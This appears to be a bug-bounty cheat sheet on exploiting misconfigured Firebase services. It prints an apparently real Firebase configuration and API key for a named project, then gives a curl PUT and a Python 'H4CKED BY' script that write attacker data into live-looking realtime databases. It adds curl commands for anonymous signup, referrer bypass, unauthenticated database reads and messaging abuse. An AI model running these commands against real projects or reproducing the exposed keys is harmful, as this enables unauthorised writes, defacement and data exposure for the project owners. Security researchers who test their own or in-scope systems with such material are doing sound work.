# Firebase

<details>

<summary>Exposed Firebaseio Configurations</summary>

**Example**

```javascript
$(document).ready(function() {
// Your web app's Firebase configuration
var firebaseConfig = {
apiKey: "AIzaSyCRrABG3_Sc7xHar70hFyjHjEOJ071rbJ4",
authDomain: "mtn-pulse-uganda.firebaseapp.com",
databaseURL: "https://mtn-pulse-uganda.firebaseio.com",
projectId: "mtn-pulse-uganda",
storageBucket: "mtn-pulse-uganda.appspot.com",
messagingSenderId: "242450689592",
appId: "1:242450689592:web:bdd1173378d94d733800cd",
measurementId: "G-KHPT64LJ5L"
};
```

**Exploit POC**

{% code overflow="wrap" %}
```bash
curl "https://mtn-pulse-uganda.firebaseio.com/poc1.json" -XPUT -d '{"attacker":"maliciousdata"}'

Your data will be uploaded to https://mtn-pulse-uganda.firebaseio.com/poc1.json
```
{% endcode %}

```python
import requests
data= {"Exploit":"Successfull", "H4CKED BY": "Sheikh Rishad"}
reponse = requests.put("https://api-project-615509201590.firebaseio.com/.json", json=data)
```

</details>

<details>

<summary>Firebase Identity Toolkit Issues</summary>

Test Firebase Identity Toolkit

{% code overflow="wrap" %}
```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyCpGNhMyM9-xMnITdD0uGSQOq2GbSrG8M0"
-H "Content-Type: application/json"
-d '{"email":"test@target.com","password":"test","returnSecureToken":true}'
```
{% endcode %}

Anonymous Signup

{% code overflow="wrap" %}
```bash
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=AIzaSyCpGNhMyM9-xMnITdD0uGSQOq2GbSrG8M0"
-H "Content-Type: application/json"
-d '{}'
```
{% endcode %}

</details>

<details>

<summary>Firebase Cloud Messaging </summary>

{% code overflow="wrap" %}
```bash
curl -s -X POST --header "Authorization: key=AI..." --header "Content-Type:application/json" 'https://fcm.googleapis.com/fcm/send' -d '{"registration_ids":["1"]}'
```
{% endcode %}

</details>

<details>

<summary>Test API Key Restrictions(Referrer Bypass)</summary>

{% code overflow="wrap" %}
```bash
curl -s -X POST -H "Content-Type: application/json"
-d '{"returnSecureToken":true}'
"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY"
```
{% endcode %}

</details>

<details>

<summary>Test Firestore Database Rules</summary>

{% code overflow="wrap" %}
```bash
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents?key=$API_KEY"
```
{% endcode %}

</details>

<details>

<summary>Test Realtime Database Rules (Unauthenticated Read)</summary>

{% code overflow="wrap" %}
```bash
curl -s "https://$PROJECT_ID-default-rtdb.firebaseio.com/.json"
```
{% endcode %}

</details>

<details>

<summary>Test Multi-Tenant Identity Abuse</summary>

{% code overflow="wrap" %}
```bash
 curl -s -X POST -H "Content-Type: application/json"
-d '{"tenantId":"'$TENANT_ID'","returnSecureToken":true}'
"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY"
```
{% endcode %}

</details>

**References**:

{% embed url="https://hackerone.com/reports/1447751" %}

{% embed url="https://hackerone.com/reports/1065134" %}
